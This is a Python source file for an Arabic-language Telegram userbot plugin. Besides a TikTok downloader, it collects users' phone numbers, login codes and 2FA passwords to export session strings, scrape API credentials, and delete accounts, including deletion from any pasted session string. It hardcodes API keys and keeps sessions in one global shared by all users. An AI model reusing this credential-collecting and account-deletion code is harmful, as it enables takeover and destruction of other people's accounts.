from pyrogram import Client, types, filters, raw
from pyrogram.errors import (
    PhoneNumberInvalid, 
    PhoneCodeInvalid, 
    SessionPasswordNeeded, 
    PasswordHashInvalid, 
    PhoneCodeExpired,
    ApiIdInvalid,
    FloodWait
)
import asyncio
import requests
from requests import Session
import urllib.request as request
from pyrogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from os import remove
from bs4 import BeautifulSoup

# --- إعدادات التيك توك ---
session = Session()
api = 'https://api.saidazim.uz/tiktok/'
turl = 'https://vm.tiktok.com/{id}'

caption = '''
- nickname : {nickname}
- username : {username}
- title : {title}
- views : {views}
- likes : {likes}
- commments : {comments}
- shares : {shares}
'''

def downloadTiktok(url):
    params = {'url': url}
    try:
        res = session.get(api, params=params).json()
        if res.get('id') is None: return {'error': '- الرابط غير صحيح!'}
        _caption = caption.format(
            nickname=res.get('nickname', ''),
            username=res.get('username', ''),
            title=res.get('title', ''),
            views=res.get('view_count', 0),
            likes=res.get('like_count', 0),
            comments=res.get('comment_count', 0),
            shares=res.get('share_count', 0)
        )
        return {
            'caption': _caption,
            'id': url.split('/')[3] if len(url.split('/')) > 3 else 'video',
            'video': res.get('video')
        }
    except Exception as e:
        return {'error': f'- حدث خطأ: {e}'}

def downloadAudio(_id):
    try:
        url = turl.format(id=_id)
        params = {'url': url}
        res = session.get(api, params=params).json()
        audio = res.get('music')
        if audio:
            request.urlretrieve(audio, f'{_id}.mp3')
    except Exception:
        pass

@Client.on_message(filters.command(["تيك توك"], "") & filters.private, group=75053)
async def reciveURL(app: Client, message: Message):
    try:
        ask = await app.ask(message.chat.id, "ارسل الان الرابط", timeout=200)
        response = downloadTiktok(ask.text)
        if response.get('error'): 
            return await ask.reply(response['error'])
        
        request.urlretrieve(response['video'], f'{response["id"]}.mp4')
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton('- تحميل الصوت -', callback_data=f'adownload {response["id"]}')],
            [InlineKeyboardButton('- Developer -', user_id=5184436120)]
        ])
        await ask.reply_video(video=f'{response["id"]}.mp4', caption=response['caption'], reply_markup=markup, reply_to_message_id=message.id)  
        try:
            remove(f'{response["id"]}.mp4')
        except:
            pass
    except Exception as e:
        await message.reply(f"حدث خطأ: {e}")

@Client.on_callback_query(filters.regex(r'^(adownload)'))
async def aDownload(_: Client, callback: CallbackQuery):
    try:
        _id = callback.data.split()[1]
        downloadAudio(_id)
        await callback.message.reply_audio(
            audio=f'{_id}.mp3',
            reply_to_message_id=callback.message.id
        )
        try:
            remove(f'{_id}.mp3')
        except:
            pass
    except Exception:
        await callback.answer("حدث خطأ أثناء تحميل الصوت", show_alert=True)

# --- إعدادات API ---
class config:
    API_HASH = "b90c282e584222babde5f68b5b63ee3b"
    API_ID = 9157919

# --- قسم حذف الحساب ---
SESSSIONS = None

@Client.on_message(filters.command(["• حذف حساب •"], "") & filters.private, group=7053)
async def DELETE_ACCOUNT_MENU(app: Client, message: types.Message):
    await app.send_message(
        chat_id=message.chat.id,
        text="مرحبًا بك في حذف حسابات تليجرام.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(text='حذف بالرقم', callback_data="DELETACCO55UNT")],
            [InlineKeyboardButton(text='حذف بالجلسه', callback_data="ADDITIONAL_ACTION")]
        ])
    )

@Client.on_callback_query(filters.regex('^ADDITIONAL_ACTION$'))
async def DELETE_BY_SESSION(app: Client, query):
    global SESSSIONS
    try:
        data = await app.ask(query.message.chat.id, "ارسل الان الجلسه", timeout=200)
        SESSSIONS = data.text
        message_data = await app.send_message(chat_id=query.message.chat.id, text='جاري التحقق ...')    
        await app.edit_message_text(
            chat_id=query.message.chat.id, 
            message_id=message_data.id, 
            text="هل أنت متأكد أنك تريد حذف الحساب؟", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="نعم اريد", callback_data='OnDelete')]])
        )
    except Exception as e:
        await app.send_message(chat_id=query.message.chat.id, text=f"حدث خطأ: {e}")

@Client.on_callback_query(filters.regex('^DELETACCO55UNT$'))
async def DELETE_BY_PHONE(app: Client, query: types.CallbackQuery):
    global SESSSIONS
    try:
        ask = await app.ask(query.message.chat.id, "ارسل لي الآن الرقم بكود الدوله مثل \n +201058741514", timeout=300)
        phone_number = ask.text
        await app.send_message(chat_id=query.message.chat.id, text="انتظر، جاري إرسال الكود")
        
        # استخدام Pyrogram Client مؤقت
        session_client = Client(name="temp_del_session", api_id=config.API_ID, api_hash=config.API_HASH, in_memory=True)
        await session_client.connect()
        
        try:
            code = await session_client.send_code(phone_number)
        except PhoneNumberInvalid:
            await session_client.disconnect()
            await app.send_message(chat_id=query.message.chat.id, text="رقم الهاتف غير صحيح.")
            return

        ask = await app.ask(query.message.chat.id, "تم إرسال الكود. ارسل الكود (مثال: 1 2 3 4 5):", timeout=300)
        phone_code = ask.text.replace(" ", "")
        
        try:
            await session_client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeExpired):
            await session_client.disconnect()
            await app.send_message(chat_id=query.message.chat.id, text="الكود غير صحيح أو منتهي.")
            return
        except SessionPasswordNeeded:
            try:
                ask = await app.ask(query.message.chat.id, "ارسل كلمة التحقق (2FA):", timeout=300)
                password = ask.text
                await session_client.check_password(password=password)
            except Exception:
                await session_client.disconnect()
                await app.send_message(chat_id=query.message.chat.id, text="كلمة المرور غير صحيحة.")
                return

        SESSSIONS = await session_client.export_session_string()
        await session_client.disconnect()
        
        await app.send_message(
            chat_id=query.message.chat.id, 
            text="تم تسجيل الدخول. هل تريد الحذف حقاً؟", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="تأكيد الحذف", callback_data='OnDelete')]])
        )
    except Exception as e:
        await app.send_message(chat_id=query.message.chat.id, text=f"حدث خطأ غير متوقع: {e}")

@Client.on_callback_query(filters.regex('^OnDelete$'))
async def CONFIRM_DELETION(app: Client, query):
    if not SESSSIONS:
        return await query.answer("لا توجد جلسة محفوظة!", show_alert=True)
    
    try:
        async with Client(name='memory_del', api_hash=config.API_HASH, api_id=config.API_ID, session_string=SESSSIONS, in_memory=True) as session_client:
            await session_client.invoke(raw.functions.account.DeleteAccount(reason="Deleted by Userbot"))
            await app.edit_message_text(chat_id=query.message.chat.id, message_id=query.message.id, text="تم حذف الحساب بنجاح ✅")
    except Exception as e:
        await app.edit_message_text(chat_id=query.message.chat.id, message_id=query.message.id, text=f"فشل الحذف: {e}")

# --- قسم استخراج API ---
@Client.on_message(filters.command(["• استخراج api •"], "") & filters.private, group=7053)
async def extract_api(app: Client, message):
    try:
        bot = await app.ask(message.chat.id, "اهلا بك \n أرسل رقم هاتفك مع رمز البلد \n مثال : \n +201015978315", timeout=200)
        phone_number = bot.text
        
        with requests.Session() as req:
            login0 = req.post('https://my.telegram.org/auth/send_password', data={'phone': phone_number})
            if 'Sorry, too many tries' in login0.text:
                await message.reply('تم حظر المحاولات لهذا الرقم. حاول لاحقاً.')
                return
            
            login_data = login0.json()
            random_hash = login_data['random_hash']
            
            await message.reply('أرسل الرمز الذي وصلك من تيليجرام (Web Login):')
            code = await app.listen(message.chat.id)
            
            login_form = {
                'phone': phone_number,
                'random_hash': random_hash,
                'password': code.text
            }        
            req.post('https://my.telegram.org/auth/login', data=login_form)        
            apps_page = req.get('https://my.telegram.org/apps')
            soup = BeautifulSoup(apps_page.text, 'html.parser')
            
            api_id = soup.find('label', string='App api_id:').find_next_sibling('div').select_one('span').get_text()
            api_hash = soup.find('label', string='App api_hash:').find_next_sibling('div').select_one('span').get_text()
            
            await message.reply(f"✅ تم الاستخراج:\n\nAPI ID: `{api_id}`\nAPI HASH: `{api_hash}`")
    except Exception:
        await message.reply('حدث خطأ أثناء الاستخراج أو أن الكود غير صحيح.')

# --- قسم استخراج الجلسة (تم الإصلاح) ---

EXTRACT_API_ID = 8186557
EXTRACT_API_HASH = "efd77b34c69c164ce158037ff5a0d117"

@Client.on_message(filters.command(["استخرج جلسه", "• استخرج جلسه •"], "") & filters.private, group=827363666)
async def extract_session_handler(client, message):
    try:
        ask = await client.ask(message.chat.id, "ارسل لي الآن الرقم مع كود الدولة:", timeout=300)
        phone_number = ask.text
        
        await message.reply_text("انتظر، جاري الاتصال بالسيرفر...")
        
        # استخدام Pyrogram Client فقط
        temp_client = Client(name="temp_sess_extract", api_id=EXTRACT_API_ID, api_hash=EXTRACT_API_HASH, in_memory=True)
        await temp_client.connect()
        
        try:
            code = await temp_client.send_code(phone_number)
        except PhoneNumberInvalid:
            await message.reply_text("❌ رقم الهاتف غير صحيح.")
            await temp_client.disconnect()
            return
        except FloodWait as e:
            await message.reply_text(f"❌ تم حظر الرقم مؤقتاً. انتظر {e.value} ثانية.")
            await temp_client.disconnect()
            return
            
        ask = await client.ask(message.chat.id, "تم الارسال. ارسل الكود (بين كل رقم مسافة إذا أمكن):", timeout=300)
        phone_code = ask.text.replace(" ", "")
        
        try:
            await temp_client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeExpired):
            await message.reply_text("❌ الكود خاطئ أو منتهي الصلاحية.")
            await temp_client.disconnect()
            return
        except SessionPasswordNeeded:
            try:
                ask = await client.ask(message.chat.id, "الحساب محمي بكلمة مرور (2FA). ارسلها الآن:", timeout=300)
                password = ask.text
                await temp_client.check_password(password=password)
            except PasswordHashInvalid:
                await message.reply_text("❌ كلمة المرور غير صحيحة.")
                await temp_client.disconnect()
                return
            except asyncio.TimeoutError:
                await message.reply_text("❌ انتهى الوقت.")
                await temp_client.disconnect()
                return

        session_string = await temp_client.export_session_string()
        await message.reply_text(f"✅ **تم استخراج الجلسة بنجاح:**\n\n`{session_string}`\n\n⚠️ حافظ عليها ولا تشاركها مع أحد.")
        await temp_client.disconnect()
        
    except Exception as e:
        await message.reply_text(f"حدث خطأ غير متوقع: {e}")
